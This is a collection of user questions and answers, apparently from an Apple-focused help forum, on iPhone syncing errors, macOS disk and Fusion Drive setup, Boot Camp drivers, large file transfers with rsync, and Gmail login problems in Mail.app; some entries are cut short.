message:\n\nThe iPhone 'X' cannot be synced. An unknown error occurred (-50)\n\nThe last backup time does change, and it isn't saying that the backup failed, but it is odd that I get that error every time.\nI am telling it to not backup any of the apps, because I don't want all that dead space on my laptop. The error seems to happen after the backup and when the sync process changes to \"Transferring purchases from X\"\nI searched around and wasn't able to find a satisfying definition of error -50 does anyone know what it is?\n\nA: I got this error just now. My Mac mini was connected to my LAN via WiFi and also via Ethernet. That was working ok, but I was trying to get the phone to sync via Wifi (still can't get that working). \nAnyway, I pulled out the Ethernet cable. Plugged the phone in via USB and when I clicked Sync I got the (-50) error you describe.\nMy solution was to exit iTunes, and then launch it again. This was enough to get the phone syncing with no error.\n\nA: This is my fix, for iPhone 6 iOS 8.4 2015\nMy problem was caused by a dummy app, I removed it through iPhone's SETTING, GENERAL, USAGE, MANAGE USAGE.\nLook for empty app name or blank icon.

That will set the login window to require a username and password to log in to the machine as well as active directory.\n", "Q: Screen Capture on Retina MacBook Pro at a Lower Resolution? I use Command+Shift+4 to capture screenshots on my MacBook Pro with a Retina display.\nI'd like to paste these captures immediately into another app I'm using. The problem I'm encountering is the resolution is so high, I have to first load them into an image editing app and scale them down 50%.\nI was wondering if there was some system config to control the scaling of screen captured images automatically to save me the extra step?\n\nA: I just ran into this exact issue the other day. Try RetinaCapture: it's a free app that captures screenshots in both 1x and 2x simultaneously (or, alternatively, just one or the other). And it's a \"true\" 1x capture: it redraws at 1x rather than taking the 2x version and scaling it down.\nIt also supports the same types of captures as the built-in Grab.app – full screen, timed screen, selection, or window – and you can save either to the clipboard or a file.\n\nA: Try the \"RetinaCapture\" app - www.retinacapture.com/\n", "Q: Remove old Apple ID Account When trying to update apps on the Apple Store I still get the account of someone who was using the computer before me:\n\nHow do I change that, it's the only place where I can't use my Apple ID account.\nPS: It sounds like I stole a computer but no, my work gave it to me and the employee before me was using it with his Apple ID account and thought he removed everything.\n\nA: Technically that person owns those apps.  You can remove the app, which removes the MAS receipt, and re download it while your signed into the app store.  Then it will be associated to your apple ID and owned by you.\n", "Q: What does the \"EU Internet\" switch do on my iPhone 5s? I have an iPhone 5s. I recently noticed that my Settings/Mobile page has a \"Data Roaming\" switch and an \"EU Internet\" switch:\n\nThe first I understand (enable data when roaming in foreign countries), but what does the second do? If I disable \"Data Roaming\", the \"EU Internet\" switch is greyed out. I assume it's related to the EU roaming regulations, but what does it actually do? Restrict data roaming to those countries?\nIn case it's relevant, my SIM plan is provided by Three UK. I have a plan with Feel at Home, (which allows me to use my data/call/text allowance for free in 16 countries - not necessarily EU ones though).\n\nA: I believe it allows data roaming, but only within European Union countries. See http://www.cultofmac.com/288360/europeans-new-roaming-options/:\n\nInside cellular settings, Apple has added a dedicated “EU Internet” switch alongside the existing data roaming toggle. It gives users the ability to active Internet connectivity when they visit countries inside the European Union, while in other parts of the world in will remain inactive.\nPresumably, this change follows new European legislation that says carriers can no longer charge customers for data roaming when they visit other EU countries. The rules don’t officially come into effect until 2015, but a number of carriers have already begun abolishing roaming fees.\n\n\nA: On a recent trip to France I found that enabling 'EU Internet' and data roaming did not work (no internet connection), but turning 'EU Internet' option off, allowed the regular Data roaming to work. \nToday, I received a txt from Vodafone confirming this and, telling all IOS8 users to turn this feature off (even if they are in Europe)... so it may well be for a future feature, but it's not working (at least for Vodafone customers) just yet - perhaps Vodafone are waiting for the legislation to kick in, and till then we just have to put up with regular Data Roaming charges!  \n\nA: The simple answer to this is that the EU Internet option is to allow the use of Local Breakout (LBO) providers, who can offer data at a different rate to your \"parent network\" most home networks will not provide any support if you are using a LBO as the provision is provided through the \"EU internet\" APN (Access Point Name).\nIn short if you don't want to use your own network's roaming plan you need this on. If you do you need it off.\n", "Q: Disable 3G on iPhone 5 with iOS8 After the update to iOS8, the switch to disable the 3G has been replaced by a disable 4G switch. \n4G is already off but how could I also disable also 3G (which is still active, as shown on the status bar) \n\nA: iOS 8.1 which will most probably be released on 20 Oct will fix the issue by adding the ability to select between 2G, 3G and LTE\n", "Q: iphone notes app that supports Dropbox sync, search, import text files automatically I search for a notes application that supports \n\n\n*\n\n*File sync with Dropbox folder\n\n*Searching the contents of the text files \n\n*Import new files from Dropbox folder automatically\n\n\nI found an app that claims to have those features, called Locayta. But on my iphone which has iOs 7.1, importing new files from Dropbox folder doesn't work. \nI wonder if there are any other notes apps that support these features?\n\nA: I currently use Simplenote to sync with my nvAlt on my Mac. While Simplenote is doing the syncing, you can configure SimpleNote to also sync to Dropbox, or you can have nvAlt store the files in Dropbox on you Mac.\nA little more in line with your question, I have used Notesy in the past. It uses Dropbox for syncing, and nvAlt could still access the files via Dropbox on my Mac. However, It was very slow to search, and I recall it had several other annoyances. I haven't tried recent versions, so it might be better. \n", "Q: Transfer SMS from Android to iPhone?

It only \"temporary\" stores. \nIt is used for when computer is running to shuffle stuff around getting it from your hard disk (memory) and putting it back to it pending what you are doing. It does not stores anything permanently.\nYour files are stored on your hard disk. So go ahead and upgrade the memory.\n", "Q: iPhone 6, iOS 8, App Store Update count doesn't update This is a small thing, but the details are where it is at. I have a new iPhone 6 running iOS 8.02 and the App Store flag says I have four new app updates to download. This was true before I downloaded all the updates in iTunes and synched with my phone. When I click on the App Store app and click on Updates 'Update All' is grayed out and there are no apps to update.\nIs this a bug? Is there some way to get rid of that annoying and misleading flag?\n\nA: Solution: Open Settings > iTunes & App Store > Automatic Downloads > Updates set to On.\n\nA: You updated the apps on your Mac, then synced to your phone, which pushed all of the application updates to your phone.\nThe App Store on the iPhone is sometimes stuck thinking you still need those updates, however when you launch the app and check for updates it comes to it's senses and realizes you've received the updates via another method.\n", "Q: Cant access firewall in system preferences; firewall tab is greyed out I have tried multiple things to rememdy this issue.

I need to copy 20TB of data onto a thunderbolt array. The box where the data exists does not have a thunderbolt connection, so I will need to utilize the local 1GB network for this. (Yes, it will take forever).\nI tried to use Filezilla/sftp, but it crashed when the queue grew super large. Is rsync or scp the way to go?\n\nA: While not as ubiquitous as rsync, I have in the past used a tool call \"mpscp\" - http://www.sandia.gov/MPSCP/mpscp_design.htm \nFrom Sandia National Labs, it's a file copy tool that runs over SSH that is specially optimized to saturate high-speed networks between close systems (such as copying terabytes of data between two supercomputers at the same site, connected via 10Gb+ or Infiniband).  It works well, but can be a bit of a pain to setup.  In testing, I've easily seen it run 2x-3x faster than rsync.\n\nA: Use rsync and consider using it with rsyncd.  If you use rsync without rsyncd, you're stuck using ssh, which means using some kind of encryption.  You're probably copying the data from an older machine to a newer machine and the older machine may not have the CPU grunt to encrypt the data for transmission fast enough to keep a gigabit Ethernet link saturated.  Test transferring batches of files using both methods and see which way is faster.\nFor the same reason I would advise testing use of rsync's compression option before committing to using it.  Compression is another CPU intensive activity that might not be able to keep up with gigabit Ethernet speeds when attempted on older hardware.  rsync is a fifteen year old program, written back when the majority of people even in first world countries accessed the Internet via dialup modem.  Network bandwidth vs. CPU tradeoffs were much different then.\n\nA: Is this 20Tb packaged in a small number of large files (like video, monster database) or millions of smaller files? \nIf lots of small files I would go with rsync for restartability or a piped tar stream for efficiency (one network connection for the lot, start again from the beginning if it fails) \ntar -cf - * | ( cd newhome; tar -xf - )\n\nremote folder must be mounted.\nCould you directly attach the new array with a different interface? Local rsync doesn't use ssh so you remove that failure point. Yes, Firewire 800 is slower than gigabit ethernet but you cannot load ethernet to 100% - it might be faster by firewire. FYI you can also network firewire if the boxes are close enough. Add the interface in system preferences -> network.\n\nA: rsync is a good way to go (scp is pretty much the same with fewer features). You may want to use the -Z option, which will enable zlib compression. Depending on how fast your drives/computer are, it may be faster than sending uncompressed, i.e. if your network link is saturated. You may also want the archive mode option, -a which will preserve symlinks, permissions, and creation/modification times, as well as copy directories recursively. Depending on what you're copying you might want -E which preserves extended attributes and mac resource forks. Finally, --progress will show you progress information.\n\nA: Another option would be to try Bittorrent Sync (http://www.bittorrent.com/sync). I've used it to sync family photos and videos between members of our family across the WAN but there's no reason it won't work for local network.  It uses peer-to-peer connections so the data would not be going through a server like it would if you tried to use something like dropbox (not that I think you have 20TB of dropbox space or want to wait that long to upload that much data!)\nIt's also supported on multiple platforms so has more flexibility than rsync and tar.\n", "Q: Update a software that has been downloaded with an apple ID associated with a deleted email address I am trying to update XCode.

Then I ran diskutil cs create MacintoshFusionDrive /dev/disk0 /dev/disk1 (SSD, HDD), reinstalled MacOS from the stick and migrated from my backup.\nUnfortunately, I didn't think about keeping the Recovery HD, so I ran from the stick diskutil cs resizeVolume on the logical volume and diskutil cs resizeDisk <UUID> <size> \"Recovery HD\" <size> on the coreStorage disk of the HDD to make a new partition on wich I then copied the contents of my recovery stick.  \nSomehow the name of the recovery partition only in the startup menu (alt boot) was localized in German but I got rid of that by running sudo bless --folder /Volumes/Recovery\\ HD -label Recovery\\ HD. I don't really understand why this happened and how that exact line solved problem. But all seem's fine now. Perhaps I accidentally copied the image on the drive back to the drive directly. Anyhow.\nIt remains to resolve the last oddity that in the startup hdd menu, there are two Fusion Drives wich both start up the system just fine. It's not a real problem but I would like to know what's causing this and how to get rid of the duplication.\n$ diskutil cs list\nCoreStorage logical volume groups (1 found)\n|\n+-- Logical Volume Group 3D7E41ED-2D3B-4C46-A696-2C0C156B6BF6\n    =========================================================\n    Name:         MacintoshFusionDrive\n    Status:       Online\n    Size:         625672790016 B (625.7 GB)\n    Free Space:   154107904 B (154.1 MB)\n    |\n    +-< Physical Volume B7097B08-1AD3-4AAA-BD1B-88BF5E0EF57E\n    |   ----------------------------------------------------\n    |   Index:    0\n    |   Disk:     disk0s2\n    |   Status:   Online\n    |   Size:     127691702272 B (127.7 GB)\n    |\n    +-< Physical Volume 12F98EE5-AE4C-4A14-8276-7915BCD06999\n    |   ----------------------------------------------------\n    |   Index:    1\n    |   Disk:     disk1s2\n    |   Status:   Online\n    |   Size:     497981087744 B (498.0 GB)\n    |\n    +-> Logical Volume Family 5E001AF2-DE08-46C2-A1DA-5637AB534553\n        ----------------------------------------------------------\n        Encryption Status:       Unlocked\n        Encryption Type:         None\n        Conversion Status:       NoConversion\n        Conversion Direction:    -none-\n        Has Encrypted Extents:   No\n        Fully Secure:            No\n        Passphrase Required:     No\n        |\n        +-> Logical Volume AC804BCD-419F-4AA0-AE01-1C7D25FF3949\n            ---------------------------------------------------\n            Disk:                  disk2\n            Status:                Online\n            Size (Total):          619999997952 B (620.0 GB)\n            Conversion Progress:   -none-\n            Revertible:            No\n            LV Name:               Fusion Drive\n            Volume Name:           Fusion Drive\n            Content Hint:          Apple_HFS\n\n\n$ diskutil list\n/dev/disk0\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *128.0 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:          Apple_CoreStorage                         127.7 GB   disk0s2\n   3:                 Apple_Boot Boot OS X               134.2 MB   disk0s3\n/dev/disk1\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *500.1 GB   disk1\n   1:                        EFI EFI                     209.7 MB   disk1s1\n   2:          Apple_CoreStorage                         498.0 GB   disk1s2\n   3:                 Apple_Boot Boot OS X               650.0 MB   disk1s3\n   4:                 Apple_Boot Recovery HD             1.1 GB     disk1s4\n/dev/disk2\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:                  Apple_HFS Fusion Drive           *620.0 GB   disk2\n\n$ sudo gpt -r show disk1\n      start       size  index  contents\n          0          1         PMBR\n          1          1         Pri GPT header\n          2         32         Pri GPT table\n         34          6         \n         40     409600      1  GPT part - C12A7328-F81F-11D2-BA4B-00A0C93EC93B\n     409640  972619312      2  GPT part - 53746F72-6167-11AA-AA11-00306543ECAC\n  973028952    1269536      3  GPT part - 426F6F74-0000-11AA-AA11-00306543ECAC\n  974298488    2212488      4  GPT part - 426F6F74-0000-11AA-AA11-00306543ECAC\n  976510976     262159         \n  976773135         32         Sec GPT table\n  976773167          1         Sec GPT header\n$ diskutil info disk1\n   Device Identifier:        disk1\n   Device Node:              /dev/disk1\n   Part of Whole:            disk1\n   Device / Media Name:      Hitachi HTS545050B9SA02 Media\n\n   Volume Name:              Not applicable (no file system)\n\n   Mounted:                  Not applicable (no file system)\n\n   File System:              None\n\n   Content (IOContent):      GUID_partition_scheme\n   OS Can Be Installed:      No\n   Media Type:               Generic\n   Protocol:                 SATA\n   SMART Status:             Verified\n\n   Total Size:               500.1 GB (500107862016 Bytes) (exactly 976773168 512-Byte-Units)\n   Volume Free Space:        Not applicable (no file system)\n   Device Block Size:        512 Bytes\n\n   Read-Only Media:          No\n   Read-Only Volume:         Not applicable (no file system)\n   Ejectable:                No\n\n   Whole:                    Yes\n   Internal:                 Yes\n   Solid State:              No\n   OS 9 Drivers:             No\n   Low Level Format:         Not supported\n\nPlease let me know, if anything else could be of help.\n\nA: Had the same question...\nFusion Drive utilizes a component of OS X called CoreStorage to work. When you boot your Mac holding down Option, you are booting into a screen running in the low-level EFI environment, before OS X has started. EFI doesn't understand what a home-built Fusion Drive is, but sees two physical drives capable of booting into OS X.\nI'm not sure of the mechanics of why factory-built Fusion Drives in the latest Macs act differently but my guess is that there is a firmware chip of some sort, like you said. Apple is known to put custom firmware on some of their hard drives.\n(Answer taken from another post)\n", "Q: Label view on Apple Mail for OSX I'm using Apple Mail on OSX (Mavericks).\nSince I'm accustomed to use Gmail webmail, which shows labels behind each email, I'm looking for a way to show labels (see for instance picture below) in a similar way on Apple Mail.\nIs it possible (I assume some plugin may exist)?\nIf not, are there other mail clients supporting this labels functionality (i.e. Mail for OSX Yosemite)?\n\n\nA: Take a look at MailTags from http://indev.ca/MailTags.html - it'll show Gmail Labels in a separate column.\n\nA: Google uses Labels instead of folders, so in Apple's mail the messages with a given label will appear in a folder with that given labels name (assuming the Show in IMAP option is selected in Gmail's Labels setting for any given label). \nIf this doesn't work for you you may want to try out http://mailplaneapp.com for your gmail/os x needs.\n", "Q: How to switch between output window and code editor in Xcode I tried google'ing around and I could not find the shortcut that can send me to the \"output window(if that's what it's called)\" after telling my program to compile and run.

It is displayed in the Debug area.\nThere are a few ways to get to it.\nIn the Toolbar Menu:\nUse the Debug area toggle button. \n\nFrom the Menu Bar : View Menu :-> Debug area :-> Show the Debug area menu\nto open the Debug area set as it was last displayed\n\n\n\nNote the shortcut for this:  cmd +  shift +   Y\nUse View Menu :-> Debug area :-> Activate Console area to Show the Debug area with the Console showing.\n\n\n\n\nNote the shortcut for this:  cmd +  shift +   C\nOr just show the Console area if the debug area is already showing.\nYou can also use the Debug area show hide toggle to show/hide either the Variable View or the  Console area  view\n\n\n\nA: Command+Shift+Y. It is a toggle shortcut which opens and closes output in Xcode.\n", "Q: iPhone 5 Music Playlist Missing I deleted some playlists on my iPhone 5 to make some space for some apps.

Everything goes smoothly in BCA. I have tried several different ISOs including one recommendation to use a specific ISO that is supposed to be a \"full\" version which includes additional drivers, but still with no luck.\n\nA: The (fixed) Pre-Installation Environment (boot.wim) of your Windows_7.iso doesn't contain the necessary drivers to use the USB3-interface of your Late 2013 Macbook Retina. So a \"non-standard Windows7.iso\" including \"additional  drivers\" without injecting/implementing them into the boot.wim won't help much either.\nBtw BOOT (X:) is not your install drive but the mounted boot.wim.\nTo circumvent limitations (new drivers, new hardware) Microsoft uses the $WinPEDriver$-feature to provide drivers at installation time.\nApple Boot Camp uses this method to provide the necessary drivers with the boot medium - your external USB drive.\nPlease check if you meet the following requirements:\n\n\n*\n\n*Backup of your entire hard disc\n\n*Windows 7.iso Home Premium x64, Professional x64, or Ultimate x64\n(these three are us-en digitalriver isos and here is a full list of all images available there). Please use Microsoft Software Recovery to download the proper Winodws 7 release.\n\n*Formatting of the USB-device (according to Apple):\nIf the size of the disk is 32 GB or less it should be MS-DOS (FAT).\nIf the size of the disk is over 32 GB it should be ExFAT.\nTry to use an USB thumb drive (size 8 GB or bigger). If you don't have a thumb drive, try to use an USB hard drive smaller than 2 TB. ExFAT formatting with  Apple disk utility.app often doesn't work (means: formatting ends in FAT32 instead of ExFAT) and according to different sources a volume size limit of 2TB exists for MS-DOS (FAT) (=FAT32).\n\n*Boot Camp Support Software version: 5.1.5640\ndownload link: Latest Boot Camp Support Software\n\n*File/Folder structure of the root of your boot device (your external USB-drive):\n\n\n\n\n\n*If your boot device doesn't contain $WinPEDriver$, AutoUnattend.xml and BootCamp please download and extract BootCamp5.1.5640.zip and copy the contents of the resulting BootCamp folder to the root level of your install drive.\n\n*If your install drive already contains those files and folders then check if the USB drivers are present.\n(Paths: /$WinPEDriver$/IntelxHCISetup/Drivers/HCSwitch/Win7/x64/ and /$WinPEDriver$/IntelxHCISetup/Drivers/xHCI/Win7/x64/).\nIf they aren't present the wrong Boot Camp Support Software package has been chosen. Delete $WinPEDriver$, AutoUnattend.xml and BootCamp and continue with step 6.\n\n\nNow the installation should work.\nIf the installation still doesn't work a more time consuming way has to be chosen (modifying the boot.vim) and i will write a second answer.\nP.S.

I looked through reviews of PDF readers and none of them mentioned specifically what I am looking for.\nI am willing to pay up to $10 for this.\nIs there an app that has what I am looking for?\n\nA: PDF Expert lets you choose from the different Apple dictionaries available (whether they are installed or not), if that is what you are searching for. If what you look for is another, custom type of dictionary where you can load your own dictionaries, I don't think PDF Expert can do so.\n\n", "Q: Stuck on Apple logo after attempted iOS 8.0.2 update My iPad was at the latest iOS 7.x when I decided to update it to 8.0.2 via iTunes.

Bluetooth can't detect the headset again.\n\nA: While there are some issues with iOS 8.0.2 and bluetooth, they are mostly isolated to in car bluetooth systems. It would be difficult to say you are being affected by this issue without more information. It could just be that your headset is not discoverable.\nIf you have selected \"forget this device\" in your Bluetooth settings, the device will no longer be detected because it knows it is paired with something and is no longer discoverable. Different headsets have different ways of being placed in discoverable mode, so you may need to consult the documentation for you specific device, but normally this consists of turning the headset off and then pressing and holding the power button until the device's LED flashes in a specific pattern indicating it is discoverable. When it is in this state your iPhone should be able to detect it and pair with it again.\n\nA: This is a known bug in iOS 8.0.2 and there is no solution at the moment..\n", "Q: How can I prevent the iPad from getting my iPhone texts or calls?

When I make photos with iPhone, these show GPS latitude + longitude in many software.\nMy normal camera has no GPS. How to add GPS info to these photos?\n\nA: Try HoudahGeo. Full disclosure: I am the developer of HoudahGeo\nHoudahGeo offers several ways for geotagging photos. My favorite is automatic geocoding using a GPS track log. Such a track log can come from an iPhone app or a GPS track logger. It has your exact position recorded every second or so. HoudahGeo matches the times on your photos to the timestamps in the track log.\nUsing a track log has the added benefit of you being able to retrace how you got from one point to the next. With HoudahGeo you can create a KML file that lets you visualize your travels in Google Earth with photos pinned at the locations where these were taken.\nIf you use both your iPhone and your digital camera to take photos at the same locations, HoudahGeo's \"Geocode from reference photos\" can copy GPS information form the iPhone photos to other photos taken at about the same time.\n\nA: Location inormation can easily be added to iCloud Photos Library photos via the macOS Photos app. \nGet Info > Assign a Location\n\n\nA: One option is to use a GPS tracker (e.g. MyTracks) on your iPhone while you are shooting with your camera and combine the GPS track with the photos in iPhoto (or wherever you manage your pictures) afterwards.\n", "Q: Another device is connected to my Clash of Clans village I have a problem when I am playing Clash of Clans, a message appears saying connection lost their is another device is connected to another village.

I have one iCloud account, and my wife has another.  I have an iPhone, and so does she.  It's easy to share calendars in iOS 8, and I'd like to do something similar with our contacts.  How can we keep our contacts synchronized between the two accounts/devices?\n\nA: Found this on a forum today.  Suppose a husband and wife want to share contacts.  In Settings > iCloud, the husband adds his account.  In it, he must sync contacts; he can also sync whatever else he wants.\nIn Settings > iCloud, the wife adds her account.  In it, she cannot sync contacts, but she can sync whatever else she wants.  In Settings > Mail, Contacts, Calendars, she adds her husband's account. In it, the only thing she syncs is contacts.\nThat's it. \n\nA: The solution I found is to create a dedicated \"shared\" or \"family\" iCloud account, and the basics are as follows:\n\n\n*\n\n*Create a new iCloud account whose sole purpose is to host all your shared contacts, e.g., smiths.shared@icloud.com\n\n\nSee Apple's Create and start using an Apple ID if you need help on how to create an iCloud account.\n\n\n*Store all your shared contacts in the shared iCloud account, but exclude your and your wife's contact cards (and any other participating family member).\n\n*Store only your and your wife's contact card in your personal iCloud accounts, e.g., I'd keep only two cards, mine and my wife's, and designate my own card as \"my\" card.\nOn iOS that means going to Settings > Contacts > My Info and tapping on my card and/or Settings > Siri > My Info and tapping on my card.\nOn Mac that means going to Contacts, locating your card, and navigating in the menu to Card > Make This My Card.\nNote\nThis works for as many family members you wish to include in the arrangement, the most important being to keep your details about the participating members in your individual personal Contacts, and everything else in the shared Contacts.\nI recommend checking Lena Shore's page Create A Shared Family Address\nBook With Contacts And iCloud that advises doing the same thing: I'd taught my friends the basics of using a dedicated shared iCloud account, but I still learned lots from Lena.\nWhy this approach\nI found the accepted answer's approach is problematic. The main headache: devices forget who you are. This is because while you can mark your own contact card as your \"Me\" card, your wife can mark theirs as \"Me\" and having two it confuses both your devices.\n\nA: We have found the best way to share contacts and keep them synced in real time is to both use the same icloud account.\n", "Q: IOS 8.0.2 Facebook launch issues - it wont launch! my facebook wont even open now the update has happended! it flashes open for a nano-second and then automatically closes again. should I also try the delete and re download?\n\nA: Try deleting the app and reinstalling the latest version from the app store.\n", "Q: Can't install OS X on MacBook Pro after installing Windows 8 So my hard drive stopped working, water damage I think. \nI bought myself a new ssd and straightaway put Windows on it as I use it for work. \nThis was a few months ago I'm now stuck as I can't figure out how to install OS X whilst Windows is its main OS. \nIf anyone has a solution that doesn't involve me wiping my ssd I'd be very happy.\n\nA: Boot with ⌘R, use Disk Utility to partition the disk, then use the OS X Utilities to reinstall OS X, selecting the new partition as the destination.\n\nA: Use a virtual machine. You can run mac on windows. But it is a hacked version of OS X so i don't think you would want it because it is not the legal copy.\n", "Q: Copy progress window missing when trying to copy in Finder When I copy on my iMac using Finder in OS X 10.9.5, the popup window which shows the copy process and other related information (Speed, Files left, etc.) does not appear.\nHow can I restore this window again?

The only thing she really uses it for anymore is iTunes.\nSince she would have access to iTunes via the iPhone once she upgrades, it is possible to sync new music purchases to the nano via the iPhone instead of pulling out a computer?\n\nA: There is no designated option to sync music between an iPod Nano and an iPhone.\nNeither the iPod Nano nor the iPod Shuffle have WIFI capabilities, so they can not use iTunes in the Clooud. Id est you have to sync you iPod with iTunes on a computer.\n", "Q: Is there away to stream music from iPad to chromecast via AirPlay? Obviously there is not native support for that. But I wonder if there are any hacks to do that. Or if there are not solutions yet is it technically possible, does apple and google expose API which could make this work?\n\nA: Afaik there is no such possibility to close that gap. I have read about an app to stream your local media from an iOS device (AirCast). It was an early beta and no longer available. Besides Google tries to prohibit such functionality to avoid bringing illegal media to TVs via their devices.\n", "Q: Terminal colors in Mavericks I am trying to get terminal colors working in 10.9. I have tried ls -G, I have tried exporting CLICOLOR=1, I have set a bunch of different TERM settings and none of it works.  Anyone know what the magic incantation is?\n\nA: The default ls program on Mavericks is BSD ls, and ls -G is the magic incantation. The ls program included in GNU Core Utilities lists with color when using the --color=auto flag, ls --color=auto. If you've possibly installed Core Utilities and neither of these work, try firing up a default Terminal.app profile (Basic, for example) and see if that works.\n", "Q: make custom user agent change permanent I need to navigate a site that makes use of javascript that checks for user agent and only permits IE9.0 (don't ask). I am using safari and can set IE 9 in the user agent submenu of the develop menu. However, when the site directs me to another page in its collection, an exception is thrown because the new page sees I am using Safari. Reseting the user agent in the develop menu does not work because the page reloads as a safari user agent. Yes I edited the com.apple.Safari plist to include the following item:\nKey:    CustomUserAgent\nclass:  String\nvalue:  Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\n\nBut safari deletes that entry every time it opens a new tab/window and reverts to default!

Recent versions of iTunes have incorporated a new behavior which is to automatically move any previous version of a mobile app to the trash when those apps are updated. As far as I can tell, there is no setting to for the user to change this behavior. \nI do not want iTunes to automatically throw away all older versions of my apps. Frequently, mobile app updates are buggy or remove functionality and I want to retain the ability to regress to previous versions. I, also, do not want to have to continue repeatedly dragging hundreds of apps from the trash back into my Mobile Applications folder. \nWhat can I do to prevent this automatic trashing of my apps? Is there a way to change this setting through the Terminal? Or an AppleScript that will override this behavior?\n\nA: I solved this by setting up a folder action using Hazel to automatically move any file in the trash with the extension .ipa or which is otherwise recognized by the system as a Mobile App to my iTunes/Mobile Applications folder. I'm sure you could set this up without using Hazel, just using folder actions. You will need to make invisible files visible before setting the action so you can at Trash as location A.\n", "Q: Not able to access special characters i.e. @,( etc How do I access special characters on the keyboard when writing emails?

I have an iPhone 6 and was wondering if there is any app that will simply display the current pressure using the barometer built into the phone?\nOr an app, other then the built in HealthKit which tracks stairs climbed, that uses that barometric pressure for something?\n\nA: There are quite a few Apps in the App Store, including Barometer, Barometer+ and Barometer++. Take your pick. This site does the research for you.\n\nA: Barometer++ (full disclosure: I worked on the app at Friends of The Web) shows the raw pressure values from the iPhone 6 or 6 Plus's barometer sensor. It also shows sea-level adjusted pressure to compare to weather stations around the world (using your GPS altitude), and shows elevation changes based on the barometer.\n\nA: Bar-o-meter is the best app at the moment. It reads the barometric sensor on the new iPhone 6/6+ and iPad Air 2. It also shows you altitude (from gps, from pressure and relative), displays up to 12 hours data in charts, has a widget and automatically fetches the value of pressure at sea level from the closest weather station. https://itunes.apple.com/us/app/bar-o-meter-altimeter-barometer/id930952204?mt=8\nIt's an easy and yet powerful utility.\n", "Q: Why does my iCloud tabs on Mac OS X not work? I have a number of Apple devices (iPhone, iPad, Macbook and Mac Mini). I would like to use iCloud tab syncing between the devices, I have successfully enabled my macbook, iPhone and iPad but I'm unable to get it working on my Mac mini. \nI can confirm the settings are all switched on but the tabs are still not visible in Safari.\nAnyone have any suggestions to fix this?\nAll devices are using the latest available software (iOS and Mac OSX)\n\nA: Sign out and sign back into iCloud on your Mac. \nThere was also a bug that if you had iCloud drive turned off for safari, your tabs wouldn't sync. So I would make sure that Safari is checked under iCloud Drive as well as iCloud settings. \n\nA: I opened a website in Safari on my iPhone 5s (iOS 8.0.2) and waited a few minutes. Then I clicked the iCloud Tabs button in the toolbar of Safari on my Mac mini (late 2012, OS X 10.9.5) and noticed that it was empty. It wasn't until I clicked the home button on my iPhone (sending Safari into the background) that the iCloud tabs synced. Try opening a website in Safari on your iPhone, then click the home button and check the iCloud tabs in Safari on your Mac mini.\n", "Q: mail.app rejecting correct password for gmail accounts Mail.app has stopped accessing several of my gmail accounts.  It gives the generic error \"Mail can't connect to the account \"xxxx\".  Enter the password for user \"myusernamehere\".  When I enter the correct password, it circles back to this error. Going directly to gmail, I can login with that same password.  \nOne of the two accounts with this problem is a new one I was setting up, but the other is my \"main\" account which has been in use with mail.app for years.\n\nA: The fix is to login to the google account affected, and then go to https://www.google.com/settings/security/lesssecureapps and select \"Enable\" for the question \"Access for less secure apps.\"  \nApparently this results from a change Google made several months ago to improve security, which is indeed becoming more and more important as Google accounts are tied to a wider and wider range of uses.  It is a mystery to me why it suddenly prevented my logging in now, but I wanted to share the solution I found in case anyone else encounters the same problem.\n\nA: I think relaxing security is the wrong answer to this problem, which I have just encountered myself.  Instead I downloaded EasyMail for Gmail, which supports the 2-step verification now required by Google. It seems fine, though I found the ads annoying so I upgraded for £3.89 to make it ad-free for life.\n", "Q: What is the __CHECKFIX1436934 environment variable? On OS X 10.9.5 my bash shell has the following environment variable set: \n__CHECKFIX1436934=1\nWhat is the purpose of this value? I am surprised there is no record of anybody asking this before.\n\nA: It comes from launch services, specifically this binary\n/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/LaunchServices\n\nand that environment variable seems to be inherited by many processes, as you can see with ps -Efax\n1436934 looks like the number of digits in recent Apple \"radar\" bug numbers, so perhaps it refers to some value used internally for testing.\n", "Q: What is the meaning of the command lsof +L1 lsof +L1\n\nMy understanding is that the command above shows files that have been deleted but are still open. These files have a “link count” of 0, meaning that there is no directory entry (no link, i.e. no name) that leads to them, but the file data still exists. The file data will be deleted when the file is closed. I commonly see references to this issue when people are talking about log files that the system is writing to. The file can be deleted but the process continues to write to the file and it takes up more and more memory. Other people have identified this sometimes as malicious behavior of malware that is trying to hide itself.\nI am trying to understand how this can happen? When I open a file to read or write to in python, the file exists on the disk. I tried reading the relevant Xcode docs on file access but it is very dense. Are there different kinds of files - those in ram and those on disk? \nThese are named files so it is not memory being used by the application. For example, running this command on my mac reveals about 300 such files. the 'offending' processes are things like loginwindow, dock, systemUIS, sharingd,CalendarA, and lots of others. If this is stuff that a process is writing to RAM, can I 'attach' myself to the process with gdb and see what it's doing? Can i write these files to the disk to read them?\n\nA: There are three things to a \"file\" on POSIX filesystems:\n\n\n*\n\n*The set of data blocks - the file's actual contents.\n\n*The inode, which is a structure that holds the list of said blocks, and some metadata (size, ownership, permissions, link count, and some others).\n\n*One or more directory entries, which contain a name and an inode number (and other things)\n\n\nWhat you see when you run ls or in file browsers are the directory entries, organized in a tree of directories and files. Each of the directory entries map the file name to an inode number. The inode number is used to locate the inode, which is used to locate the actual blocks (and check permissions, etc.)\nWhen you create a file, an inode is created with an initial link count of one, and a directory entry is set up with the name you specified, pointing to that inode.\nIf you create a hard link, a second directory entry is made with the name you chose, but pointing to the same inode - both directory entries refer to the same inode (i.e. you now have two names that refer to the same file). The link count of the inode is incremented for each new hard link.\nWhen a process opens a file, using a file name, the kernel does the directory entry lookup, finds the inode, and returns a file descriptor that \"refers to\" the inode, not the directory entry. The directory entry is irrelevant once the file has been opened - it is just a convenient way to locate the right inode.\nWhen you delete a file (e.g. using rm), you're not actually deleting the file, you're deleting the directory entry. The kernel decrements the inode's link count, but doesn't delete the inode (and reclaim space) unless:\n\n\n*\n\n*that directory entry was the last one pointing to it (i.e. link count is down to zero - this is what lsof +L1 lists: open files that are completely unlinked)\n\n*there are no remaining open file descriptors that refer to it\n\n\nSo processes can continue operating on that file, even if there is no way to get back to it from browsing the filesystem. And you can get apparent inconsistencies from the output of df and du for instance:\n\n\n*\n\n*df interrogates the 